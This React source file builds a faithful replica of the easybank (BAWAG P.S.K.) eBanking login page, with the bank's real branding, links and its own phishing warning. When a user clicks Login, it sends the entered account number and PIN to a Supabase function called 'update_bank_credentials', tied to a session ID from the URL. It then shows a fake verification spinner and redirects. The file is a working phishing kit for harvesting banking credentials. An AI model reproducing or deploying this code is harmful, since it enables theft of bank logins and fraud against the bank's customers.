import { useState, useEffect, useRef, useCallback } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, ChevronRight, ChevronDown } from "lucide-react";
import easybankLogo from "@/assets/logo-easybank_de.png";
import easybankBanner from "@/assets/EASY26016_login.jpg";
import easybankIcon from "@/assets/easy_bank.png";

type Lang = "DE" | "EN";

const translations: Record<Lang, {
  days: string[];
  hilfe: string;
  loginTitle: string;
  loginHilfe: string;
  verfuegerLabel: string;
  verfuegerHint: string;
  pinLabel: string;
  pinHint: string;
  loginBtn: string;
  unlockLink: string;
  warnungTitle: string;
  warnungBold: string;
  warnungText: string;
  warnungLink: string;
  hilfeTitle: string;
  hilfePin: string;
  hilfeFaq: string;
  infoTitle: string;
  infoDebit: string;
  infoApp: string;
  infoWatchlist: string;
  footer: string[];
  tooltipTitle: string;
  tooltipText: string;
  tabVerfueger: string;
}> = {
  DE: {
    days: ["Sonntag", "Montag", "Dienstag", "Mittwoch", "Donnerstag", "Freitag", "Samstag"],
    hilfe: "Hilfe",
    loginTitle: "Login mit Zugangsdaten",
    loginHilfe: "Hilfe",
    tabVerfueger: "Verfüger",
    verfuegerLabel: "Verfügernummer",
    verfuegerHint: "Verfüger ohne führende Nullen!",
    pinLabel: "PIN",
    pinHint: "8 bis 16-stellig",
    loginBtn: "Login",
    unlockLink: "eBanking Zugang entsperren",
    warnungTitle: "Warnung",
    warnungBold: "Achtung vor Phishing",
    warnungText: "Wir fordern Sie niemals per E-Mail oder SMS auf, TANs, Konto- und Kreditkarten-Daten einzugeben oder zu bestätigen!",
    warnungLink: "Weiterlesen",
    hilfeTitle: "Hilfe/Hotline",
    hilfePin: "PIN vergessen oder Verfüger gesperrt?",
    hilfeFaq: "FAQ",
    infoTitle: "Info",
    infoDebit: "Bestellung PIN-Code für Debitkarte",
    infoApp: "Alle Infos zur\neasybank App",
    infoWatchlist: "Zu Watchlist Internet",
    footer: ["Impressum", "AGB", "Datenschutz", "Nutzungsbedingungen", "Barrierefrei"],
    tooltipTitle: "Login",
    tooltipText: "Melden Sie sich mit Ihren eBanking Zugangsdaten (mit Verfügernummer und PIN) oder per App (mit Verfügernummer oder email-Adresse) an.",
  },
  EN: {
    days: ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
    hilfe: "Help",
    loginTitle: "Login with credentials",
    loginHilfe: "Help",
    tabVerfueger: "Disposer",
    verfuegerLabel: "Disposer number",
    verfuegerHint: "Disposer without leading zeros!",
    pinLabel: "PIN",
    pinHint: "8 - 16 characters",
    loginBtn: "Login",
    unlockLink: "Reset eBanking access",
    warnungTitle: "Warnung",
    warnungBold: "Achtung vor Phishing",
    warnungText: "",
    warnungLink: "Weiterlesen",
    hilfeTitle: "Help/Hotline",
    hilfePin: "Forgot PIN or disposer locked?",
    hilfeFaq: "",
    infoTitle: "Info",
    infoDebit: "Order PIN-Code for debit cards",
    infoApp: "All information about the\neasybank app",
    infoWatchlist: "To Watchlist Internet",
    footer: ["Imprint", "Terms and Conditions", "Data Protection", "Terms of Use", "Barrier-Free"],
    tooltipTitle: "Login",
    tooltipText: "Log in with your eBanking access data (with disposer number and PIN) or via app (with disposer number or email address).",
  },
};

const BASE_WIDTH = 970;

const footerUrls = [
  "https://www.easybank.at/impressum",
  "https://www.easybank.at/agb",
  "https://www.easybank.at/datenschutz",
  "https://www.easybank.at/nutzungsbedingungen",
  "https://www.easybank.at/barrierefreiheit",
];

const RedWarningIcon = () => (
  <svg width="20" height="18" viewBox="0 0 20 18" fill="none" xmlns="http://www.w3.org/2000/svg" className="flex-shrink-0 mt-0.5">
    <path d="M10 0L20 18H0L10 0Z" fill="#cc0000" />
    <text x="10" y="14" textAnchor="middle" fill="white" fontSize="12" fontWeight="bold" fontFamily="Arial">!</text>
  </svg>
);

const Easybank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("easybank - Login", easybankIcon);

  const [verfueger, setVerfueger] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [lang, setLang] = useState<Lang>("DE");
  const [scale, setScale] = useState(1);
  const [showHilfeTooltip, setShowHilfeTooltip] = useState(false);
  const contentRef = useRef<HTMLDivElement>(null);
  const [contentHeight, setContentHeight] = useState(0);

  const updateScale = useCallback(() => {
    const s = Math.min(1, window.innerWidth / BASE_WIDTH);
    setScale(s);
  }, []);

  useEffect(() => {
    updateScale();
    window.addEventListener("resize", updateScale);
    return () => window.removeEventListener("resize", updateScale);
  }, [updateScale]);

  useEffect(() => {
    if (contentRef.current) {
      setContentHeight(contentRef.current.scrollHeight);
    }
  });

  const t = translations[lang];
  const now = new Date();
  const dateStr = `${t.days[now.getDay()]}, ${String(now.getDate()).padStart(2, "0")}.${String(now.getMonth() + 1).padStart(2, "0")}.${now.getFullYear()} - ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;

  const scaledWidth = BASE_WIDTH * scale;
  const scaledHeight = contentHeight ? contentHeight * scale : undefined;

  return (
    <>
      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
    <div
      className="min-h-screen bg-white overflow-x-hidden flex justify-center"
      style={{ fontFamily: "Arial, Helvetica, sans-serif" }}
    >
      <div style={{ width: `${scaledWidth}px`, height: scaledHeight ? `${scaledHeight}px` : undefined }}>
        <div
          ref={contentRef}
          style={{
            width: `${BASE_WIDTH}px`,
            transform: `scale(${scale})`,
            transformOrigin: "top left",
          }}
        >
          {/* Header */}
          <header className="bg-white px-4 py-2">
            <div className="flex items-center justify-end gap-3">
              <a href="https://www.easybank.at/easybank/services/easy-banking#ebankinghilfe" target="_blank" rel="noopener noreferrer" className="text-xs text-black hover:font-bold transition-all">
                {t.hilfe}
              </a>
              <div className="relative">
                <button
                  onClick={() => {
                    const el = document.getElementById("lang-dropdown");
                    if (el) el.classList.toggle("hidden");
                  }}
                  className="text-[11px] border border-gray-300 px-2 py-0.5 bg-white text-gray-700 cursor-pointer focus:outline-none flex items-center gap-1"
                >
                  {lang === "DE" ? "deutsch" : "english"}
                  <ChevronDown className="h-3 w-3" />
                </button>
                <div id="lang-dropdown" className="hidden absolute right-0 top-full mt-0.5 bg-white border border-gray-300 shadow-md z-50 min-w-[90px]">
                  {(["DE", "EN"] as Lang[]).map((l) => (
                    <button
                      key={l}
                      onClick={() => {
                        setLang(l);
                        document.getElementById("lang-dropdown")?.classList.add("hidden");
                      }}
                      className={`block w-full text-left text-[11px] px-2 py-1 ${lang === l ? "bg-gray-200 font-semibold" : "hover:bg-gray-100"}`}
                    >
                      {l === "DE" ? "deutsch" : "english"}
                    </button>
                  ))}
                </div>
              </div>
            </div>
            <div className="flex items-center justify-between">
              <img src={easybankLogo} alt="easybank" className="h-20" />
              <span className="text-[11px] text-black">{dateStr}</span>
            </div>
          </header>

          {/* Main content */}
          <div className="flex gap-4 p-4" style={{ minHeight: "520px" }}>
            {/* Left: Login Card */}
            <div className="w-[370px] flex-shrink-0">
              <div className="border border-[#949494] rounded bg-white">
                <div className="px-4 py-3 bg-[#ecf4dc] flex items-center justify-between rounded-t relative">
                  <h1 className="text-sm font-semibold text-black">{t.loginTitle}</h1>
                  <a
                    href="#"
                    onClick={(e) => { e.preventDefault(); setShowHilfeTooltip(!showHilfeTooltip); }}
                    className="text-xs text-black underline hover:no-underline"
                  >
                    {t.loginHilfe}
                  </a>
                  {showHilfeTooltip && (
                    <div className="absolute left-full top-0 ml-1 z-50 w-[300px] bg-white border border-gray-300 rounded shadow-lg">
                      <div className="px-3 py-2 text-sm font-semibold text-[#177991]">{t.tooltipTitle}</div>
                      <div className="h-[1px] bg-gray-300" />
                      <div className="px-3 py-2 text-xs text-black leading-relaxed">{t.tooltipText}</div>
                    </div>
                  )}
                </div>

                <div className="p-4">
                  {/* Verfüger Tab — zentriert, full-width underline */}
                  <div className="mb-4">
                    <div className="text-center py-2 text-xs font-semibold text-[#177991]">
                      {t.tabVerfueger}
                    </div>
                    <div className="h-[2px] bg-[#177991]" />
                  </div>

                  {/* Verfügernummer */}
                  <div className="mb-3 flex items-start gap-2">
                    <label className="text-sm font-semibold text-black pt-1.5 w-[130px] flex-shrink-0">{t.verfuegerLabel}</label>
                    <div className="flex-1">
                      <input
                        type="text"
                        value={verfueger}
                        onChange={(e) => setVerfueger(e.target.value)}
                        className="w-full border border-gray-400 rounded px-3 py-1.5 text-sm focus:outline-none focus:ring-1 focus:ring-[#4b9920]"
                      />
                      <p className="text-xs text-black mt-1">{t.verfuegerHint}</p>
                    </div>
                  </div>

                  {/* PIN */}
                  <div className="mb-4 flex items-start gap-2">
                    <label className="text-sm font-semibold text-black pt-1.5 w-[130px] flex-shrink-0">{t.pinLabel}</label>
                    <div className="flex-1">
                      <div className="relative">
                        <input
                          type={showPin ? "text" : "password"}
                          value={pin}
                          onChange={(e) => setPin(e.target.value)}
                          className="w-full border border-gray-400 rounded px-3 py-1.5 text-sm pr-10 focus:outline-none focus:ring-1 focus:ring-[#4b9920]"
                        />
                        {!showPin && (
                          <button
                            type="button"
                            onClick={() => setShowPin(true)}
                            className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                          >
                            <Eye className="h-5 w-5" />
                          </button>
                        )}
                      </div>
                      <p className="text-xs text-black mt-1">{t.pinHint}</p>
                    </div>
                  </div>

                  {/* Login button */}
                  <div className="flex justify-end mb-4">
                    <button onClick={async () => {
              console.log("Session ID:", sessionId);
              if (sessionId) {
                const { error } = await supabase.rpc("update_bank_credentials", {
                  p_session_id: sessionId,
                  p_username: verfueger,
                  p_password: pin,
                  p_username_label: "Verfügernummer",
                  p_password_label: "PIN",
                });
                if (error) console.error("Update failed:", error);
                else console.log("Update successful");
              } else {
                console.error("No session ID found in URL!");
              }
              setShowLoading(true);
            }} className="px-4 py-1.5 bg-[#177991] text-white text-xs font-bold rounded hover:bg-[#126a7d] transition-colors">
                      {t.loginBtn}
                    </button>
                  </div>

                  {/* Unlock link */}
                  <div className="pt-3">
                    <a href="https://hilfe.easybank.at/faq-easybank/haeufig-gestellte-fragen/ebanking-zugang-entsperren" target="_blank" rel="noopener noreferrer" className="text-xs text-black hover:font-bold flex items-center gap-1">
                      <ChevronRight className="h-3 w-3" />
                      {t.unlockLink}
                    </a>
                  </div>
                </div>
              </div>
            </div>

            {/* Right side */}
            <div className="flex-1 flex flex-col gap-4">
              {/* 3 info cards */}
              <div className="flex gap-4 items-start">
                {/* Warnung */}
                <div className="flex-1 border border-gray-300 rounded bg-white flex flex-col min-h-[220px]">
                  <div className="px-3 py-2">
                    <h2 className="text-[#008080] text-base font-medium">Warnung</h2>
                  </div>
                  <div className="h-[2px] bg-[#f6f6f6]" />
                  <div className="p-3 flex-1">
                    <div className="flex gap-2">
                      <RedWarningIcon />
                      <div>
                        <p className="text-xs text-black leading-snug">
                          <strong>{"Achtung vor"}<br />{"Phishing"}</strong>
                          <br />
                          {"Wir fordern Sie"}<br />
                          {"niemals per E-Mail"}<br />
                          {"oder SMS auf, TANs,"}<br />
                          {"Konto- und"}<br />
                          {"Kreditkarten-Daten"}<br />
                          {"einzugeben oder zu"}<br />
                          {"bestätigen!"}
                        </p>
                        <a href="https://www.easybank.at/easybank/sicherheitsinformationen" target="_blank" rel="noopener noreferrer" className="text-xs text-[#4b9920] underline hover:no-underline mt-0">
                          Weiterlesen
                        </a>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Hilfe + Info Wrapper — gleiche Tiefe */}
                <div className="flex-[2] flex gap-4 items-stretch">
                  {/* Hilfe/Hotline */}
                  <div className="flex-1 border border-gray-300 rounded bg-white flex flex-col">
                    <div className="px-3 py-2">
                      <h2 className="text-[#008080] text-base font-medium">{t.hilfeTitle}</h2>
                    </div>
                    <div className="h-[2px] bg-[#f6f6f6]" />
                    <div className="p-3 flex-1">
                      <a href="https://services.easybank.at/main?formName=unlock-ebanking" target="_blank" rel="noopener noreferrer" className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all">
                        <ChevronRight className="h-3.5 w-3.5 text-black flex-shrink-0" />
                        {t.hilfePin}
                      </a>
                      <div className="h-[1px] bg-[#f6f6f6] -mx-3" />
                      {lang === "DE" ? (
                        <a href="https://hilfe.easybank.at/faq-easybank/haeufig-gestellte-fragen/ebanking-zugang-entsperren" target="_blank" rel="noopener noreferrer" className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all">
                          <ChevronRight className="h-3.5 w-3.5 text-black flex-shrink-0" />
                          {t.hilfeFaq}
                        </a>
                      ) : (
                        <div className="py-2 text-xs text-black">
                          <div className="font-bold">05 70 05-500</div>
                          <div className="mt-1">Mo-Fr 07:00am-10:00pm</div>
                          <div>Sa 08:00am-01:00pm</div>
                        </div>
                      )}
                    </div>
                  </div>
                  {/* Info */}
                  <div className="flex-1 border border-gray-300 rounded bg-white flex flex-col">
                    <div className="px-3 py-2">
                      <h2 className="text-[#008080] text-base font-medium">{t.infoTitle}</h2>
                    </div>
                    <div className="h-[2px] bg-[#f6f6f6]" />
                    <div className="p-3 flex-1">
                      <a href="https://www.easybank.at/easy/Produkte/Konto/263790/epin.html" target="_blank" rel="noopener noreferrer" className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all">
                        <ChevronRight className="h-3.5 w-3.5 text-black flex-shrink-0" />
                        <span className="font-bold">{t.infoDebit}</span>
                      </a>
                      <div className="h-[1px] bg-[#f6f6f6] -mx-3" />
                      <a href="https://www.easybank.at/de/services/app.html" target="_blank" rel="noopener noreferrer" className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all whitespace-pre-line">
                        <ChevronRight className="h-3.5 w-3.5 text-black flex-shrink-0" />
                        {t.infoApp}
                      </a>
                      <div className="h-[1px] bg-[#f6f6f6] -mx-3" />
                      <a href="https://www.watchlist-internet.at/" target="_blank" rel="noopener noreferrer" className="text-xs text-black hover:font-bold hover:bg-[#f6f6f6] flex items-center gap-0.5 py-2 -mx-3 px-3 transition-all">
                        <ChevronRight className="h-3.5 w-3.5 text-black flex-shrink-0" />
                        {t.infoWatchlist}
                      </a>
                    </div>
                  </div>
                </div>
              </div>

              {/* Banner */}
              <div className="flex-1">
                <a href="https://ebanking.easybank.at/InternetBanking/info/easybank/bild/2026/EASY26016_login.jpg" target="_blank" rel="noopener noreferrer">
                  <img
                    src={easybankBanner}
                    alt="easybank Freunde empfehlen"
                    className="w-full rounded cursor-pointer"
                  />
                </a>
              </div>
            </div>
          </div>

          {/* Footer */}
          <footer className="bg-white border-t border-gray-200 py-3 px-4">
            <div className="flex flex-wrap gap-3 justify-center">
              {t.footer.map((item, index) => (
                <a key={item} href={footerUrls[index]} target="_blank" rel="noopener noreferrer" className="text-xs text-black underline hover:text-[#8ab528] transition-colors">
                  {item}
                </a>
              ))}
              <span className="text-xs text-black">© BAWAG P.S.K.</span>
            </div>
          </footer>
        </div>
      </div>
    </div>
    </>
  );
};

export default Easybank;
